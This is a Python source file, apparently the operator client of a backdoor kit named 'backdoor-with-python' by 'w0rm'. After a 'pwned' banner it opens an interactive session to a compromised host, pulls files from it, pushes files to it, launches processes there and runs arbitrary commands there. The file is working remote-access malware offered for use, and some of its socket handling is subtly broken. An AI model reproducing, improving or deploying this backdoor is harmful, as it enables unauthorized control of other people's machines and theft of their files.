#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import socket
import os

END_OF_STRING = "[XX]END OF STRING[XX]"
END_OF_FILE = "[XX]END OF DATA[XX]"


def banner():
    print("""
                                                   /$$
                                                  | $$
  /$$$$$$  /$$  /$$  /$$ /$$$$$$$   /$$$$$$   /$$$$$$$
 /$$__  $$| $$ | $$ | $$| $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$ | $$ | $$| $$  \ $$| $$$$$$$$| $$  | $$
| $$  | $$| $$ | $$ | $$| $$  | $$| $$_____/| $$  | $$
| $$$$$$$/|  $$$$$/$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$
| $$____/  \_____/\___/ |__/  |__/ \_______/ \_______/
| $$                                                  
| $$                                                  
|__/                                                       
                                             """)


def info():
    print("[--] Version 1.0                                     [--]")
    print("[--] Dev: w0rm                                       [--]")
    print("[--] https://github.com/w0rmkit/backdoor-with-python [--]")
    print("[--] https://twitter.com/swagggs_                    [--]")
    print("[--] type 'help' to see available commands           [--]")


def help():
    print("[00] use ':' font of command or it will run on computer")
    print("[01] :download <file>")
    print("[02] :upload <file>")
    print("[03] :newProcess <PROGRAM> <args>")
    print("[04] 'exit' ends session")
    print("")


def connectClient(ip, port):
    global session, host
    session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ip

    try:
        session.connect((host, port))

        banner()
        print("[--] Connected to %s" % host)
        print()
        info()
        prompt()
    except socket.error:
        print("[--] Can't connect")
        exit()


def prompt():
    command = input("[%s] $ " % host)

    if command == "exit":
        session.send("Process is exitd".encode('utf-8'))
        session.close()
        exit()
    elif command == "help":
        help()

    elif command == "pwd":
        print((os.getcwd() + "\n"))

    elif command[0:2] == 'cd':
        os.chdir(command[3:])
        print("moved to another directory\n")

    elif command.startswith(":"):

        if command[1:9] == "download": #Download from server to client
            session.send(command)

            fileName = command[10:]

            while True:
                l = session.recv(1024)

                if l.startswith("File not found"):
                    printOnConsole(l)
                    break

                f = open(fileName, 'w')
                while (l):
                    if l.endswith(END_OF_FILE):
                        if END_OF_FILE in l:
                            l = l.replace(END_OF_FILE, "")
                        f.write(l)
                        break
                    else:
                        f.write(l)
                        l = session.recv(1024)

                print("Download complete\n")
                f.close()
                break
        elif command[1:7] == "upload":
                
            session.send(command)
            fileName = command[8:]

            try:
                f = open(fileName, 'r')
                l = f.read(1024)

                while (l):
                    session.send(l)
                    l = f.read(1024)
                f.close()
                session.send(END_OF_FILE)
                printOnConsole(session.recv(1024))
            except IOError:
                    print("File not found\n")

        else:
            session.send(command)
            result = session.recv(1024)

            while not result.endswith(END_OF_STRING):
                result += session.recv(1024)

            printOnConsole(result)
    else:

        os.system(command)
        print("")

    prompt()


def printOnConsole(string):
    if END_OF_STRING in string:
        string = string.replace(END_OF_STRING, '')
    print(string)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("python terminal.py host port(default:8888)")
        exit()
    else:
        connectClient(sys.argv[1], int(sys.argv[2]))
			